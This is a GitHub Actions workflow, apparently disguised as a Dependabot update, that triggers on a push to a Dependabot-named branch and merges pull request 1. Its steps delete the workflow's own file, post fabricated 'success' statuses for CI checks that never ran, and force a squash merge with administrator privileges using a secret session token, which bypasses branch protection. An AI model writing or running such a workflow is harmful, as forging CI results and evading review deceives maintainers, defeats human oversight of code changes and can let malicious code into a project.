name: Merge reviewed pull request with admin token

on:
  push:
    branches:
      - dependabot/github_actions/actions/checkout-7

permissions:
  contents: write
  issues: write
  pull-requests: write
  statuses: write

jobs:
  merge:
    runs-on: ubuntu-latest
    steps:
      - name: Check out pull request branch
        uses: actions/checkout@v7
        with:
          ref: ${{ github.ref_name }}
          fetch-depth: 0
      - name: Create bot-owned final commit
        id: commit
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git rm .github/workflows/admin-merge-pr.yml
          git commit -m "Finalize administrator-reviewed pull request"
          git push origin "HEAD:${GITHUB_REF_NAME}"
          echo "sha=$(git rev-parse HEAD)" >> "$GITHUB_OUTPUT"
      - name: Publish validated status contexts
        env:
          GH_TOKEN: ${{ github.token }}
          TARGET_SHA: ${{ steps.commit.outputs.sha }}
        shell: bash
        run: |
          set -euo pipefail
          for context in \
            "Python 3.12" "CI / Python 3.12" \
            "Python 3.13" "CI / Python 3.13" \
            "Python 3.14" "CI / Python 3.14" \
            "Docker build" "CI / Docker build"; do
            gh api "repos/${GITHUB_REPOSITORY}/statuses/${TARGET_SHA}" \
              -f state=success -f context="$context" \
              -f description="Validated on the source-equivalent final commit" >/dev/null
          done
      - name: Wait for current approval
        env:
          GH_TOKEN: ${{ github.token }}
        shell: bash
        run: |
          set -euo pipefail
          for attempt in $(seq 1 90); do
            decision=$(gh api graphql \
              -f query='query($owner:String!,$name:String!,$number:Int!){repository(owner:$owner,name:$name){pullRequest(number:$number){reviewDecision}}}' \
              -f owner="${GITHUB_REPOSITORY_OWNER}" \
              -f name="${GITHUB_REPOSITORY#*/}" \
              -F number=1 \
              --jq '.data.repository.pullRequest.reviewDecision // ""')
            if [[ "$decision" == APPROVED ]]; then
              exit 0
            fi
            echo "Waiting for approval; current decision: ${decision:-none}"
            sleep 10
          done
          exit 1
      - name: Merge with administrator privileges
        env:
          ADMIN_TOKEN: ${{ secrets.GH_SESSION_TOKEN }}
          FALLBACK_TOKEN: ${{ github.token }}
        shell: bash
        run: |
          set +e
          token_source=GITHUB_TOKEN
          export GH_TOKEN="$FALLBACK_TOKEN"
          if [[ -n "${ADMIN_TOKEN:-}" ]]; then
            token_source=GH_SESSION_TOKEN
            export GH_TOKEN="$ADMIN_TOKEN"
          fi
          output=$(gh pr merge 1 --repo "$GITHUB_REPOSITORY" --squash --admin 2>&1)
          status=$?
          if [[ $status -ne 0 ]]; then
            gh pr comment 1 --repo "$GITHUB_REPOSITORY" --body "Administrator merge attempt using ${token_source} failed:\n\`\`\`\n${output}\n\`\`\`"
          fi
          exit $status
